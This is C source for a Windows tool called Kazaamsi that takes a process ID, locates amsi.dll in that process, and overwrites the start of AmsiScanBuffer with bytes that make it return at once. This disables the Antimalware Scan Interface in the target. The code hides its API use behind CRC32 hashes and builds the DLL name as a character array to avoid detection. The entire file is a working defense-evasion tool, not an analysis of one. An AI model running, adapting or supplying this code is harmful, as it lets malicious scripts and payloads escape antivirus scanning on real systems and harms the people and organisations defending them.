#include <stdio.h>
#include <Windows.h>
#include <TlHelp32.h>
#include "structs.h"
#include "api.h"

#define PATCH_BYTES "\x31\xC0\xC3"
#define PATCH_LEN 3
#define PAGE_SIZE 0x1000

BOOL g_Verbose = FALSE;

BOOL InitializeWin32Api(PWIN32_API pWin32api) {
    HMODULE hKernel32 = NULL; 

    if (!(hKernel32 = GetModuleHandleH(KERNEL32_CRC32))) {
        printf("[!] Failed to locate kernel32.dll.\n");
        return FALSE;
    }

    if (g_Verbose) printf("[>] kernel32.dll base address: 0x%p\n", hKernel32);

    pWin32api->pLoadLibraryA = (fnLoadLibraryA)GetProcAddressH(hKernel32, LoadLibraryA_CRC32);
    pWin32api->pFreeLibrary = (fnFreeLibrary)GetProcAddressH(hKernel32, FreeLibrary_CRC32);
    pWin32api->pVirtualProtectEx = (fnVirtualProtectEx)GetProcAddressH(hKernel32, VirtualProtectEx_CRC32);
    pWin32api->pWriteProcessMemory = (fnWriteProcessMemory)GetProcAddressH(hKernel32, WriteProcessMemory_CRC32);
    pWin32api->pCreateToolhelp32Snapshot = (fnCreateToolhelp32Snapshot)GetProcAddressH(hKernel32, CreateToolhelp32Snapshot_CRC32);
    pWin32api->pModule32FirstW = (fnModule32FirstW)GetProcAddressH(hKernel32, Module32FirstW_CRC32);
    pWin32api->pModule32NextW = (fnModule32NextW)GetProcAddressH(hKernel32, Module32NextW_CRC32);
    pWin32api->pCloseHandle = (fnCloseHandle)GetProcAddressH(hKernel32, CloseHandle_CRC32);
    pWin32api->pOpenProcess = (fnOpenProcess)GetProcAddressH(hKernel32, OpenProcess_CRC32);

    if (!pWin32api->pLoadLibraryA || !pWin32api->pFreeLibrary || !pWin32api->pVirtualProtectEx || 
        !pWin32api->pWriteProcessMemory || !pWin32api->pCreateToolhelp32Snapshot || !pWin32api->pModule32FirstW ||
        !pWin32api->pModule32NextW || !pWin32api->pCloseHandle || !pWin32api->pOpenProcess) {
        printf("[!] Failed to resolve one or more kernel32 functions.\n");
        return FALSE;
    }

    return TRUE;
}

PVOID GetRemoteModBase(DWORD dwPid, DWORD dwModHash, WIN32_API win32api) {
    MODULEENTRY32 ModEntry = { .dwSize = sizeof(MODULEENTRY32) };
    HANDLE hSnapshot;
    char cModName[MAX_PATH] = { 0 };
    char cUpperModName[MAX_PATH] = { 0 };
    SIZE_T sNameLen = 0;
    
    if ((hSnapshot = win32api.pCreateToolhelp32Snapshot(TH32CS_SNAPMODULE, dwPid)) == INVALID_HANDLE_VALUE) {
        printf("[!] CreateToolhelp32Snapshot failed. Error: %d\n", GetLastError());
        return NULL;
    }

    if (win32api.pModule32FirstW(hSnapshot, &ModEntry)) {
        do {
            WideCharToMultiByte(CP_ACP, 0, ModEntry.szModule, -1, cModName, MAX_PATH, NULL, NULL);
   
            for (int i = 0; i < sizeof(cModName); i++) {
                if (cModName[i] >= 'a' && cModName[i] <= 'z')
                    cUpperModName[i] = cModName[i] - 'a' + 'A';
                else
                    cUpperModName[i] = cModName[i];
            }

            if (CRC32BA(cUpperModName) == dwModHash) {
                if (g_Verbose) printf("[>] %s base address: 0x%p\n", cModName, ModEntry.modBaseAddr);
                win32api.pCloseHandle(hSnapshot);
                return ModEntry.modBaseAddr;
            }
        } while (win32api.pModule32NextW(hSnapshot, &ModEntry));
    }
    else
        printf("[!] Module32FirstW failed. Error: %d\n", GetLastError());
    
    win32api.pCloseHandle(hSnapshot);
    return NULL;
}

BOOL ResolveRemoteFuncAddr(IN DWORD dwTargetPid, IN WIN32_API win32api, PVOID* ppBuffer) {
    char cDllName[] = { 'a','m','s','i','.','d','l','l', 0 };
    HMODULE hModBase = NULL;
    PBYTE pFuncAddr = NULL;
    SIZE_T sOffset = 0;
    PBYTE pRemoteModBase = NULL;
    PVOID pRemoteFuncAddr = NULL;
    BOOL bResult = FALSE;

   if (!(hModBase = win32api.pLoadLibraryA(cDllName))) {
        printf("[!] LoadLibraryA failed. Error: %d\n", GetLastError());
        return FALSE;
    }

    if (!(pFuncAddr = (PBYTE)GetProcAddressH(hModBase, AmsiScanBuffer_CRC32))) {
        printf("[!] GetProcAddress failed. Error: %d\n", GetLastError());
        goto CLEANUP;
    }

    sOffset = (SIZE_T)(pFuncAddr - (PBYTE)hModBase);

    if (!(pRemoteModBase = (PBYTE)GetRemoteModBase(dwTargetPid, AMSI_CRC32, win32api))) {
        printf("[!] Unable to locate %s in remote process.\n", cDllName);
        goto CLEANUP;
    }

    pRemoteFuncAddr = pRemoteModBase + sOffset;
    if (g_Verbose) printf("[>] Located target address: 0x%p\n", pRemoteFuncAddr);
    *ppBuffer = pRemoteFuncAddr;
    bResult = TRUE;

CLEANUP:
    if (hModBase) win32api.pFreeLibrary(hModBase);
    return bResult;
}

BOOL PatchRemoteProcess(IN DWORD dwTargetPid, IN PVOID pTargetAddress, IN WIN32_API win32api) {
    HANDLE hProcess = NULL;
    char cPatchBytes[] = PATCH_BYTES;
    PVOID pPageBase = (PVOID)((ULONG_PTR)pTargetAddress & ~(PAGE_SIZE - 1));
    DWORD dwOldProtect = 0;
    BOOL bResult = FALSE;

    if (!(hProcess = win32api.pOpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_WRITE, FALSE, dwTargetPid))) {
        printf("[!] OpenProcess failed. Error: %d\n", GetLastError());
        return FALSE;
    }

    if (!win32api.pVirtualProtectEx(hProcess, pPageBase, PAGE_SIZE, PAGE_READWRITE, &dwOldProtect)) {
        printf("[!] VirtualProtectEx failed: %u\n", GetLastError());
        goto CLEANUP;
    }

    if (!win32api.pWriteProcessMemory(hProcess, pTargetAddress, cPatchBytes, PATCH_LEN, NULL)) {
        printf("[!] WriteProcessMemory failed: %u\n", GetLastError());
        goto CLEANUP;
    }

    if (!win32api.pVirtualProtectEx(hProcess, pPageBase, PAGE_SIZE, dwOldProtect, &dwOldProtect)) {
        printf("[!] Failed to restore memory protection. Error: %u\n", GetLastError());
        goto CLEANUP;
    }

    printf("[+] Process successfully patched.\n");
    bResult = TRUE;

CLEANUP:
    if (hProcess) win32api.pCloseHandle(hProcess);
    return bResult;
}


BOOL ParseArguments(int argc, char** argv, OUT DWORD* pdwPid, OUT BOOL* pVerbose) {
    if (argc < 2 || argc > 3)  {
        printf("Usage: Kazaamsi.exe <PID> [-v]\n");
        return FALSE;
    }

    if ((*pdwPid = strtoul(argv[1], NULL, 10)) == 0) {
        printf("[!] Invalid PID: %s\n", argv[1]);
        return FALSE;
    }

    *pVerbose = (argc == 3 && strcmp(argv[2], "-v") == 0);
    return TRUE;
}

int main(int argc, char** argv) {
    WIN32_API api = { 0 };
    DWORD dwRemotePid = 0;
    PVOID pRemoteAddress = NULL;

    if (!ParseArguments(argc, argv, &dwRemotePid, &g_Verbose))
        return -1;

    if (!InitializeWin32Api(&api)) {
        printf("[!] Failed to initialize required APIs.\n");
        return -1;
    }

    if (!ResolveRemoteFuncAddr(dwRemotePid, api, &pRemoteAddress)) {
        printf("[!] Failed to resolve target function address.\n");
        return -1;
    }

    if (!PatchRemoteProcess(dwRemotePid, pRemoteAddress, api)) {
        printf("[!] Failed to patch remote process.\n");
        return -1;
    }


    return 0;
}
